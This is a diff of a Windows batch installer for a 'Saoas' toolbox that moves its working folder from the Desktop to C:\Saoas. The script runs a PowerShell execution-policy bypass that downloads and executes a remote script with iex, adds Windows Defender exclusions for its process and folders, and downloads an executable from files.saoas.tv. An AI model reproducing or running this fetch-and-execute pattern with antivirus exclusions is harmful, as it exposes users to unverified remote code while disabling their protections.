@@ -12,7 +12,6 @@ exit /b %ERRORLEVEL%
 
 set "psCommand=Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://files.saoas.tv/path.ps1'))"
 
-mkdir "%USERPROFILE%\Desktop\Saoas_Tools"
 mkdir "C:\Saoas"
 
 powershell -NoLogo -Sta -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "& {%psCommand%}"
@@ -22,12 +21,11 @@ powershell -Command Add-MpPreference -ExclusionProcess "Multi_Downloader.exe" -F
 powershell -Command Add-MpPreference -ExclusionPath "%USERPROFILE%\Desktop\Saoas_Tools" -Force
 powershell -Command Add-MpPreference -ExclusionPath "C:\Saoas" -Force
 
-cd "%USERPROFILE%\Desktop\Saoas_Tools"
+cd "C:\Saoas"
 powershell Invoke-WebRequest -Uri "https://eternallybored.org/misc/wget/1.21.4/64/wget.exe" -OutFile "wget.exe"
-xcopy %USERPROFILE%\Desktop\Saoas_Tools\wget.exe C:\Saoas /y
-wget -q --show-progress --user-agent="chrome" --no-hsts https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe -O Saoas_Toolbox.exe
-del %USERPROFILE%\Desktop\Saoas_Tools\wget.exe
-move %USERPROFILE%\Desktop\Saoas_Tools\Saoas_Toolbox.exe %USERPROFILE%\Desktop
+
+cd /d "%USERPROFILE%\Desktop"
+powershell Invoke-WebRequest -Uri "https://files.saoas.tv/Toolbox/Saoas_Toolbox.exe" -OutFile "Saoas_Toolbox.exe"
 
 ```
 
